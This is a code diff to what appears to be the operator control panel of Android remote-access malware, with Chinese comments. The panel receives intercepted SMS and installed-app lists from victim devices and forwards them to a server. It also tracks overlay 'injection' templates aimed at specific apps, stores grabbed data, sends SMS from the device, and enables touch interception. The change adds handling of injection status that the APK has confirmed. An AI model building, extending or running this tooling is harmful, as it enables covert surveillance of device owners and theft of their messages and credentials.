@@ -270,6 +270,8 @@ export default function ControlPage({ user: _user } = {}) {
   const [injectionConfigs, setInjectionConfigs] = useState([])
   const [injActivePkgs, setInjActivePkgs] = useState(new Set()) // 正在注入中的包名
   const [injActiveIds, setInjActiveIds] = useState(new Set())   // 正在注入中的模板ID
+  const [injConfirmedPkgs, setInjConfirmedPkgs] = useState(new Set()) // APK 已回复启用的包名
+  const [injConfirmedIds, setInjConfirmedIds] = useState(new Set())   // APK 已回复启用的模板ID
   const [injGrabbed, setInjGrabbed] = useState([])              // 已抓取数据
   const [injLoading, setInjLoading] = useState(null)            // 当前操作中的模板ID
   // 设备日志数据已迁移到 LogsTab 组件自管状态（2026-08-06 v2）
@@ -833,7 +835,7 @@ export default function ControlPage({ user: _user } = {}) {
             if (type === 'app_list_response' || type === 'APP_LIST_RESPONSE') { const apps = msg.data?.apps || msg.apps || []; if (Array.isArray(apps)) { setAppList(apps); addLog(`收到应用列表: ${apps.length} 个`); api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'apps', data: apps }) }).catch(() => {}) } else { setAppList([]) } setAppLoading(false); return }
             if (type === 'sms_data' || type === 'SMS_DATA') { const smsList = msg.data?.smsList || msg.smsList || msg.data?.messages || []; if (Array.isArray(smsList) && smsList.length > 0) { setSmsList(smsList); setSmsTotal(msg.data?.count || smsList.length); addLog(`收到短信: ${smsList.length} 条`); api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'sms', data: smsList }) }).catch(() => {}) } setSmsLoading(false); return }
             if (type === 'sms_send_result' || type === 'SMS_SEND_RESULT') { const success = msg.data?.success ?? msg.success; const phone = msg.data?.phoneNumber || msg.phoneNumber || ''; const sim = msg.data?.simSlot ?? msg.simSlot ?? 0; if (success) { centerToast(`短信发送成功: ${phone} (卡${sim + 1})`); addLog(`短信发送成功: ${phone}`) } else { toast(`短信发送失败: ${phone}`, 'error'); addLog(`短信发送失败: ${phone}`) } setSmsSending(false); return }
-            if (type === 'injection_status') { const enabledPackages = msg.data?.enabledPackages || msg.enabledPackages || []; if (Array.isArray(enabledPackages)) { setInjActivePkgs(new Set(enabledPackages)); addLog(`注入状态更新: ${enabledPackages.length} 个应用`) } return }
+            if (type === 'injection_status') { const enabledPackages = msg.data?.enabledPackages || msg.enabledPackages || []; const enabledTemplateIds = msg.data?.enabledTemplateIds || msg.enabledTemplateIds || []; if (Array.isArray(enabledPackages)) { setInjActivePkgs(new Set(enabledPackages)); setInjConfirmedPkgs(new Set(enabledPackages)); if (Array.isArray(enabledTemplateIds)) { setInjActiveIds(new Set(enabledTemplateIds)); setInjConfirmedIds(new Set(enabledTemplateIds)) } addLog(`注入状态已确认: ${enabledPackages.length} 个应用`) } return }
             // ★ 2026-08-06：设备端 debug_log 消息（如 "触摸拦截已启用"）→ 显示 toast
             if (type === 'debug_log' && msg.data?.message) {
               const debugMsg = msg.data.message
@@ -1506,8 +1508,12 @@ export default function ControlPage({ user: _user } = {}) {
           sendWs={sendWs}
           injActivePkgs={injActivePkgs}
           injActiveIds={injActiveIds}
+          injConfirmedPkgs={injConfirmedPkgs}
+          injConfirmedIds={injConfirmedIds}
           setInjActivePkgs={setInjActivePkgs}
           setInjActiveIds={setInjActiveIds}
+          setInjConfirmedPkgs={setInjConfirmedPkgs}
+          setInjConfirmedIds={setInjConfirmedIds}
           injGrabbed={injGrabbed}
           setInjGrabbed={setInjGrabbed}
           parseGrabbedData={parseGrabbedData}
